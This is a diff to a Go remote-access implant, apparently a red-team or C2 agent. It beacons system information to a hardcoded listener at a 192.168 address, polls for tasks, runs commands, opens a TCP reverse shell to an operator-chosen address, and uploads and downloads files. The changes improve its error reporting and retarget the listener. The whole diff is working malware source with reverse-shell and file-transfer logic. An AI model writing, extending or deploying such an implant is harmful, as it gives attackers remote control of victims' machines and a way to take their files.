@@ -78,13 +78,20 @@ func system_info() []byte{
 }
 
 func run_command(command string){
-	cmd := exec.Command("bash", "-c", command)
+	cmd := exec.Command(command)
 	stdout, err := cmd.Output()
 	output, success = string(stdout), err == nil
 }
 
 func reverse_shell(address string, port string){
-	conn, _ := net.Dial("tcp", address+":"+port)
+	conn, err := net.Dial("tcp", address+":"+port)
+
+	if err != nil {
+		output, success = "Could not connect.", false
+		return
+	} else {
+		output, success = "Opened reverse shell.", true
+	}
 	for {
  
 	   message, err := bufio.NewReader(conn).ReadString('\n')
@@ -117,7 +124,7 @@ func download_file(task_name string, path string){
 	resp, err := http.Get(URL + "/download/" + task_name)
 
 	if err != nil || resp.StatusCode != http.StatusOK {
-		output, success = "Reverse shell started.", true
+		output, success = "Could not download file.", false
 		return
 	}
 
@@ -125,8 +132,11 @@ func download_file(task_name string, path string){
 
 	// Create the file locally
 	file, err := os.Create(path)
+
+	defer file.Close()
+	
 	if err != nil {
-		output, success = "Reverse shell started.", true
+		output, success = "Could not create file.", false
 		return
 	}
 
@@ -134,11 +144,12 @@ func download_file(task_name string, path string){
 	_, err = io.Copy(file, resp.Body)
 
 	if err != nil {
-		output, success = "Reverse shell started.", true
+		output, success = "Could not write to file.", false
 		return
 	}
 
-	output, success = "File downloaded.", true
+	output, success = "File downloaded successfully.", true
+
 }
 
 func upload_file(file_name string) {
@@ -169,7 +180,7 @@ func upload_file(file_name string) {
 
 func main() {
 	name = ""
-	LISTENER_IP = "192.168.2.184"
+	LISTENER_IP = "192.168.172.1"
 	LISTENER_PORT = "9999"
 	URL = "http://" + LISTENER_IP + ":" + LISTENER_PORT
 	// Set up the HTTP client
@@ -177,7 +188,7 @@ func main() {
 	
 	data := system_info()
 
-	fmt.Println("Connecting to the l1stener...")
+	fmt.Println("Connecting to the L15t3n€r...")
 	resp, err := client.Post(URL+"/connect", "application/json", bytes.NewBuffer(data))
 
 	if err != nil {
@@ -193,6 +204,7 @@ func main() {
 
 	for {
 		time.Sleep(time.Duration(sleep_time) * time.Second)
+
 		// Get the tasks
 		resp, err := client.Get(URL + "/tasks/" + name)
 		if err != nil {
@@ -225,7 +237,6 @@ func main() {
 				run_command("ls " + task.Args["dir"].(string))
 			case "reverse-shell":
 				go reverse_shell(task.Args["address"].(string), task.Args["port"].(string))
-				output, success = "Reverse shell started.", true
 			case "download":
 				upload_file(task.Args["target_path"].(string))
 			case "upload":
@@ -234,6 +245,7 @@ func main() {
 				output, success = "Invalid action.", false
 			}
 			fmt.Println("Task: ", task.ID, "Output: ", output, "Success: ", success)
+			
 			data, err := json.Marshal(map[string]any{
 				"task":    task.ID,
 				"output":  output,
@@ -241,7 +253,6 @@ func main() {
 			})
 
 			if err != nil {
-				fmt.Println("Could not marshal JSON.")
 				continue
 			}
 
